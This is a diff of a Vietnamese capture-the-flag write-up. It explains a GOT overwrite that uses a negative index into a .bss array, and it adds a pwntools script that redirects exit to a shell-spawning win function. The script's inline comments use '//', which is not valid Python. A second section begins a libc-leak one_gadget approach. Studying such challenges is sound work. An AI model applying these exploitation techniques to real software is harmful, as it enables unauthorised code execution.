@@ -16,13 +16,45 @@ Hàm `view()` cũng có lỗ hổng *Out of bounds* khi gọi printf trực ti�
 
 <img width="1206" height="335" alt="image" src="https://github.com/user-attachments/assets/52dfd245-9ec9-4195-af90-265149a7408c" />
 
-Vì RELRO không ở trạng thái FULL RELRO nên ta vẫn có thể ghi đè vào bảng GOT. 
+- Vì RELRO không ở trạng thái FULL RELRO nên ta vẫn có thể ghi đè vào bảng GOT. 
+- PIE tắt cho phép dùng trực tiếp địa chỉ binary mà không cần địa chỉ base.
 
-## Khai thác 
+# Khai thác (ret2win)
 
 <img width="890" height="334" alt="image" src="https://github.com/user-attachments/assets/fcf6b3e0-16dc-489a-a41b-1f1fde1fe37d" />
 
 Mảng users nằm ở phân vùng .BSS có quyền `rw-`, nằm chung phân vùng với bảng GOT của chương trình. Có thể ghi đè lên bảng GOT qua hàm `input_player()` khi nhập index âm.
+
+<img width="795" height="337" alt="image" src="https://github.com/user-attachments/assets/544f83a3-7f98-4590-b689-a73c46e630a5" />
+
+Trong chương trình có hàm `win` gọi sẵn `system("/bin/sh")`. chỉ cần ghi đè lên 1 hàm bất kì trong bảng GOT để chuyển hướng tạo shell.
+
+## Scipt python
+
+    #!/usr/bin/env python3
+    from pwn import *
+    context.binary=exe=ELF('./vuln_patched',checksec=False)
+    libc=ELF('./libc.so.6')
+    p=process(exe.path)
+    
+    p.sendafter(b'First, create a user.',b'zyan')
+    
+    payload=p64(libc.sym['system'])
+    payload+=p64(libc.sym['printf'])
+    payload+=p64(libc.sym['memset'])
+    payload+=p64(libc.sym['read'])
+    payload+=p64(exe.sym['fopen'])
+    payload+=p64(libc.sym['perror'])
+    payload+=p64(libc.sym['__isoc99_scanf'])
+    payload+=p64(exe.sym['win'])                   //ghi đè win lên exit
+    
+    p.sendlineafter(b'Input your choice:',b'1')    //input_player
+    p.sendlineafter(b'id',b'-2')
+    p.sendafter(b'name',payload)
+    
+    p.sendlineafter(b'Input your choice:',b'4')    //exit
+
+# Khai thác (one_gadget)
 
 Đầu tiên leak libc để có được libc.address tính địa chỉ các hàm libc và gadget. Sử dụng hàm `view()` trong chương trình để in ra màn hình dữ liệu nằm trên mảng users. Vì mảng users có kích thước mỗi phần tử là 80 nên leak `__libc_start_main` là khả thi nhất vì từ users đến đó cách 240 BYTES về trước tương ứng với -3*80.
 
